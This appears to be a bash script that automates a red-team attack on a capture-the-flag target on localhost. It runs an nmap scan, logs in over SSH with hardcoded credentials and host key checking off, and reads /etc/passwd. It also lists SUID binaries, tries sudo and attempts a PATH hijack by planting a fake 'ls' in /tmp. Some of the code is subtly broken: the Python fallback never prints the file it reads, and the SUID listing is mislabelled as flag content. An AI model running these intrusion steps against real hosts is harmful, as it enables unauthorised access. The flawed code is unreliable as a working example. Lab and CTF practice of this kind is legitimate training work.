#!/bin/bash

# Red Team Attack Script
# This script executes attack strategies to capture the flag

# Set up logging
LOG_FILE="./logs/red_team.log"
OUTPUT_FILE="./logs/red_agent_output.json"

echo "$(date) - Red team operations starting..." > $LOG_FILE
echo "{\"status\": \"initializing\", \"time\": \"$(date)\"}" > $OUTPUT_FILE

# Function to log activity
log_activity() {
    echo "$(date) - $1" >> $LOG_FILE
    echo "{\"time\": \"$(date)\", \"action\": \"$1\"}" >> $OUTPUT_FILE
}

# Target information
TARGET_IP="127.0.0.1"
TARGET_SSH_PORT="2222"
TARGET_HTTP_PORT="8081"
CTF_USER="ctf"
CTF_PASS="ctf123"
FLAG_PATH="/var/ctf/flag.txt"

log_activity "Starting reconnaissance phase"

# Phase 1: Reconnaissance
log_activity "Scanning target ports"
PORT_SCAN=$(nmap -p 2222,8081 $TARGET_IP)
log_activity "Port scan results: $PORT_SCAN"

# Phase 2: Access
log_activity "Attempting SSH access"
SSH_CMD="sshpass -p $CTF_PASS ssh -o StrictHostKeyChecking=no -p $TARGET_SSH_PORT $CTF_USER@$TARGET_IP"

# Test SSH connection
if $SSH_CMD "echo 'Connection successful'" &>/dev/null; then
    log_activity "SSH access successful"
else
    log_activity "SSH access failed. Trying alternative methods..."
    exit 1
fi

# Phase 3: Exploration
log_activity "Exploring file system"
FILE_LISTING=$($SSH_CMD "find / -type f -name '*.txt' 2>/dev/null")
log_activity "Found text files: $FILE_LISTING"

# Check if we found the flag file
if echo "$FILE_LISTING" | grep -q "$FLAG_PATH"; then
    log_activity "Flag file located at $FLAG_PATH"
else
    log_activity "Flag file not found in basic search. Trying advanced techniques..."
fi

# Phase 4: Exploitation
log_activity "Attempting to access flag file"

# Try using sudo
SUDO_ATTEMPT=$($SSH_CMD "sudo cat $FLAG_PATH 2>&1")
log_activity "Sudo attempt result: $SUDO_ATTEMPT"

# Try finding alternate permissions/links
PERM_CHECK=$($SSH_CMD "ls -la $FLAG_PATH 2>&1")
log_activity "Permission check: $PERM_CHECK"

# Try creating a symbolic link
SYMLINK_ATTEMPT=$($SSH_CMD "ln -s $FLAG_PATH ~/flag_link 2>&1")
log_activity "Symlink attempt: $SYMLINK_ATTEMPT"

# Try using other system users to access
OTHER_USERS=$($SSH_CMD "cat /etc/passwd | grep -v 'nologin' | cut -d: -f1")
log_activity "Other system users: $OTHER_USERS"

# Phase 5: Exfiltration
log_activity "Attempting flag exfiltration"

# Method 1: Direct file read with different techniques
FLAG_CONTENT=""

# Try with cat
FLAG_CONTENT=$($SSH_CMD "cat $FLAG_PATH 2>/dev/null")

# If cat failed, try with Python
if [ -z "$FLAG_CONTENT" ]; then
    FLAG_CONTENT=$($SSH_CMD "python3 -c 'open(\"$FLAG_PATH\", \"r\").read()' 2>/dev/null")
fi

# If Python failed, try with dd
if [ -z "$FLAG_CONTENT" ]; then
    FLAG_CONTENT=$($SSH_CMD "dd if=$FLAG_PATH bs=1 count=100 2>/dev/null")
fi

# Try to brute force with common exploits
if [ -z "$FLAG_CONTENT" ]; then
    FLAG_CONTENT=$($SSH_CMD "find / -perm -u=s -type f 2>/dev/null")
    log_activity "Searching for SUID binaries: $FLAG_CONTENT"
    
    # Try to exploit path
    FLAG_CONTENT=$($SSH_CMD "echo 'cat $FLAG_PATH' > /tmp/ls && chmod +x /tmp/ls && PATH=/tmp:$PATH ls")
fi

# If we found the flag
if [[ "$FLAG_CONTENT" == *"flag{"* ]]; then
    FLAG=$(echo "$FLAG_CONTENT" | grep -o "flag{.*}")
    log_activity "SUCCESS: Flag captured: $FLAG"
    echo "{\"status\": \"success\", \"flag\": \"$FLAG\", \"time\": \"$(date)\"}" > $OUTPUT_FILE
else
    log_activity "Failed to capture flag. Last attempt output: $FLAG_CONTENT"
    echo "{\"status\": \"failed\", \"time\": \"$(date)\"}" > $OUTPUT_FILE
fi

log_activity "Red team operations completed" 